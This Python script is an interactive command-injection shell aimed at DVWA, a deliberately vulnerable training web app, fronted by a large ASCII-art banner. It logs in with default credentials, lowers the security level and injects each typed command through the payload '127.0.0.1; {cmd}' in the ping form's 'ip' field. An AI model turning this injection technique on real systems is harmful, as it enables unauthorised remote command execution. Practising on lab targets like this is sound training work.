import requests
import argparse
import os
from datetime import datetime

# ====================== CONFIG & BANNER ======================
BANNER = r"""


                                                                                                                                                      
                                                                                                                                                      
                                                                                                                                                      
                                                                                                                                                      
                                                                                                                                                      
                                                                                                                                                      
                                                                                                                                                      
                                                                                                                                                      
                                                              #######            ########                                                             
                                                            ###+++###################+#####                                                           
                                                          ####++++++++++++#+#+#+++++++++++###                                                         
                                                        #####+++++++++++++++++++++++++++++++###                                                       
                                                      ###+++++++++++++++++++++++++++++++++++++###                                                     
                                                     ###++++++++++++++++++++++++++++++++++++++++##                                                    
                                                    ##++++++++++++++++++++++++++++++++++++++++++##                                                    
                                                    #++++++++++++++++++++++++++++++++++++++++++++##                                                   
                                                   -##++++++++++++++++++++++++++++++++++++++++++++#                                                   
                                                   ##++++++++++++++++++++++++++++++++++++++++++++##                                                   
                  #######                          #++++++++++++++++++++++++++++++++++++++++++++++##                         #######                  
                 ## ##   ###                       #++++++++++++++++++++++++++++++++++++++++++++++##                      ###  ### ##                 
                 # #######  ##                    ##++++++++++++++++++++++++++++++++++++++++++++++###                   ##  ####### #                 
                 ###+++#####  ##                  ##+++++++++++++++###+++++##+++++++++++++++++++++###                 ##  ####+++####                 
                 #+++++++++###  ###               ##+#+++#######+###+##+###+#########+#########+++++#              ### ####+++++++++#                 
                 ##++++++++++####  ##            #########     ######+#+# ### #+#+#####.    #########            ##  ####++++++++++##                 
                 ##++++++++++++####  +##         ###  ### # ######  ######  #######  ###### # ##  #+##        ###  ####++++++++++++##                 
                  ##+++++++++++++#####  ###    ## ## ###### ##+++####           .#####++#+########### #    ###  ####+++++++++++++++#                  
                   #+++++++++++++++++####  ### # ## ##+#   ##+###+################+##+###.#    #+## ### ###  #####++++++++++++++++##                  
                   ###++++++++++++++++++####   ### ##+#########+++++++++++++++++++++++++++######++## ###  ####+++++++++++++++++++##                   
                    ##+++++++++++++++++++++#####   #####+++++++++++++++++++++++++++++++++++++#######   ####+++++++++++++++++++++##                    
                     ###+++++++++++++++++++++++#####   #######+++++++++++++++++++++++++########.   ######+++++++++++++++++++++###                     
                      ##+++++++++++++++++++++++++++######    #-#########################++    ######+++++++++++++++++++++++++###                      
                       ###++++++++++++++++++++++++++###  #######                       ####### ####+++++++++++++++++++++++++###                       
                         ###+++++++++++++++++++++++###      # ########################## ##      ##++++++++++++++++++++++#####                        
                          ####++++++++++++++++++++++#    -  ##    # # ## ###. # # #      #        #+++++++++++++++++++++####                          
                            ###++++++++++++++++++++##  ##########                     ########## ##+++++++++++++++++++####                            
                              ###++++++++++++++++++##  #+++#########     #  #      ########+++#  ##++++++++++++++++#+###                              
                                #####++++++++++++++### ##++## ###########+   ###### ####  #++##  ##+++++++++++++++####                                
                                   ####+++++++++++###   ######     #+####     ###+##    ###+###  ###+++++++++######                                   
                                      #####+++++++##    ###++###########      ####+########+##    ##+++++++#####                                      
                                          ######++#       ############    # #   #############      #++#######                                         
                                              ######                #    ##+#     #              # ####                                               
                                                   ###                  ###+##                  # ##                                                  
                                                    ## #               ##+#+###               #  ##    #########                                      
                                                      ###   ##         ####+#+##        ###   ####  ####++++##########                                
                                                      ########## #     #### #+##     # ########+# ###++++++####                                       
                                                     ### # #++###       ##  ###      ###++## ######+++#+#####                                         
                                                   ##  ##+ ###+###                    #+#+#   #+++++#####                                             
                                                  ## # ##   ##+##                  -  #+###   ##++++#    ##                                           
                                                 ##  ## #    ##+#### # # #  ## ### #  #+##    ##++++############                                      
                                                 # # ### #   #####      #  #  # # #######    ###+++####++++++++###     #                              
                                                #  #  ######  # ## ####    #  # ###   ##   ###++++##  ###+++++########                                
                                             +###  ## ##+++##  #    # #  ###### # ###     ###+###+# #   ####+##                                       
                                            ## # # ### ###++##     #  # ## #  #  #       ###+##+### ##   #########                                    
                                           ## #########  ##+###            ##          ####+## #### # ##   +####+##                                   
                                           ## #+++#-+###  ###+###                     ##++### ##+## ## ##      ##########                             
                                           ## ###### ####   ######                  ###+###  ##++# ### ##                                             
                                           ### ##+#########   ######               #######  ####+##### ##                                             
                                            ### ######++#-###   #######         #######   ### ##+##+####                                              
                                            ###  ### ###### ###     ################    ### ###+++++++##                                              
                                             ###  ###  ######  ####                  ####  ###++++#####                                               
                                              ####  ###  #######  ########    ######### #####++++## ##                                                
                                               ####  ####  ##########   ########+##  #####++++++## ###                                                
                                               ######  ####    ##########++++++++#####+++++++++## ###                                                 
                                                ##++###   ####    ###########++#+#######+++++### ###                                                  
                                                 ###++###   ######       #####+#-##   #++++#######                                                    
                                                   ##+++####   ############. ###++#####+++### ###                                                     
                                                    ####+++#####    ##########++####+++#### ####                                                      
                                                      ###+#++++######     ####++++++##### #####                                                       
                                                        ####+++++##########++++++++###  #####                                                         
                                                          ######++++++++++++##+##### ######                                                           
                                                             ####++++++++++##+-#  #######                                                             
                                                                #######+#+##.#########                                                                
                                                                   #######+##++####                                                                   
                                                                        -#######                                                                      
                                                                                                                                                      
                                                                                                                                                      
                                                                                                                                                      
                                                                                                                                                      
                                                                                                                                                      
                                                                                                                                                      
                                                                                                                                            
"""

def print_banner():
    print("\033[92m" + BANNER + "\033[0m")  # Green text (remove \033 codes if you prefer plain)

# ====================== MAIN TOOL ======================
def main():
    parser = argparse.ArgumentParser(description="DVWA Command Injection Interactive Shell")
    parser.add_argument("-t", "--target", default="http://127.0.0.1", 
                        help="DVWA base URL (e.g. http://192.168.56.102)")
    parser.add_argument("-u", "--user", default="admin", help="Username")
    parser.add_argument("-p", "--password", default="password", help="Password")
    parser.add_argument("-l", "--log", default="dvwa_session.log", 
                        help="Log file for session (great for reports)")
    args = parser.parse_args()

    base_url = args.target.rstrip("/")
    log_file = args.log

    print_banner()
    print(f"[*] Target: {base_url}")
    print(f"[*] Logging session to: {log_file}\n")

    session = requests.Session()

    # ------------------- Login -------------------
    print("[*] Logging into DVWA...")
    login_url = f"{base_url}/login.php"
    login_data = {
        "username": args.user,
        "password": args.password,
        "Login": "Login"
    }
    r = session.post(login_url, data=login_data, allow_redirects=True)
    
    if "Welcome to Damn Vulnerable Web Application" in r.text:
        print("[+] Login successful!")
    else:
        print("[-] Login failed. Check target URL and credentials.")
        return

    # ------------------- Set security to low -------------------
    print("[*] Setting security level to low...")
    security_url = f"{base_url}/security.php"
    session.post(security_url, data={"security": "low", "seclev_submit": "Submit"})
    session.get(f"{security_url}?security=low")  # fallback method

    vuln_url = f"{base_url}/vulnerabilities/exec/"
    print("[+] Ready. Command injection shell active.\n")

    # Simple session logger
    def log_entry(command, output):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(log_file, "a") as f:
            f.write(f"[{timestamp}] CMD: {command}\n")
            f.write(f"OUTPUT:\n{output}\n")
            f.write("-" * 80 + "\n")

    # ------------------- Interactive Shell -------------------
    while True:
        try:
            cmd = input(f"\033[92mdvwa-shell>\033[0m ").strip()
            
            if cmd.lower() in ["exit", "quit"]:
                print("[*] Closing shell. Goodbye!")
                break
            elif cmd.lower() == "help":
                print("Available commands:\n  help     - Show this help\n  clear    - Clear screen\n  exit     - Exit shell\n  Any other input = OS command to inject")
                continue
            elif cmd.lower() == "clear":
                os.system('clear' if os.name == 'posix' else 'cls')
                print_banner()
                continue
            elif not cmd:
                continue

            # Command injection payload
            payload = f"127.0.0.1; {cmd}"
            data = {"ip": payload, "Submit": "Submit"}

            response = session.post(vuln_url, data=data)

            # Clean output extraction
            if "<pre>" in response.text and "</pre>" in response.text:
                output = response.text.split("<pre>")[1].split("</pre>")[0].strip()
            else:
                output = response.text.strip()

            print(output)
            log_entry(cmd, output)

        except KeyboardInterrupt:
            print("\n[*] Interrupted. Use 'exit' to close properly.")
        except Exception as e:
            print(f"[-] Error: {e}")

if __name__ == "__main__":
    main()